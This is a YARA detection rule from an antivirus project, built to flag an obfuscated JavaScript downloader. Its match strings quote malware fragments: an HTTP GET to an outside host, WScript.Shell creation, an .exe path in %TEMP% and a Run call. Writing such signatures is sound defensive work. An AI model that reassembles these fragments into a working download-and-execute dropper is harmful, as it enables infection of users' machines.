rule sig_20160401_c951dc841c977d0fc1ad9757d3e02cc2 {
  meta:
    description = "datamaliciousorder - file 20160401_c951dc841c977d0fc1ad9757d3e02cc2.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "9df4359509f7ec20e928f6f2b66cbfa4af4a4a5dbd34a72a611df85e5ee82117"

  strings:
    $s1  = "EcxZw[DtsOy](\"G\" + \"ET\", \"http://be-stlines-tore.com/j38sf\", false);" fullword ascii
    $s2  = "function KerPb(WcQns, CuEb){VviKm = VviKm * 1; return WcQns - CuEb;};" fullword ascii
    $s3  = "var GhAmw = function LwBi() {return WScript[OflMn](\"WScript\"+\".Shell\");}(), UyvSo = 11;" fullword ascii
    $s4  = "if (EcxZw[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function OcVj(){return YjJsz + \"\";};" fullword ascii
    $s6  = "function NdLvj() {return GhAmw[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"mHfeKuaMM4ez.ex\" + \"e\";};" fullword ascii
    $s7  = "function DeYkr() {return ((UjNx == true) && (UjNx == CrkXnc)) ? 1 : VviKm;};" fullword ascii
    $s8  = "function UoNv(EmlNrn) {var QhRc = (1, 2, 3, 4, 5, EmlNrn); return QhRc;};" fullword ascii
    $s9  = "return KerPb(ImRhs, KfiSdo);" fullword ascii
    $s10 = "var RwsJmo = false;" fullword ascii
    $s11 = "var YcRkr = new this[\"Date\"]();" fullword ascii
    $s12 = "UjNx = true; " fullword ascii
    $s13 = "function TuyPi(GjJcg){GhAmw[\"R\"+\"un\"](GjJcg, VviKm, VviKm);};" fullword ascii
    $s14 = "function LxeQr(){return 23;};" fullword ascii
    $s15 = "function OwgZl()" fullword ascii
    $s16 = "var CrkXnc = false;" fullword ascii
    $s17 = "var UjNx = false;" fullword ascii
    $s18 = "}while (EmZud);" fullword ascii
    $s19 = "function MvKa(){return OflMn;};" fullword ascii
    $s20 = "CrkXnc = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}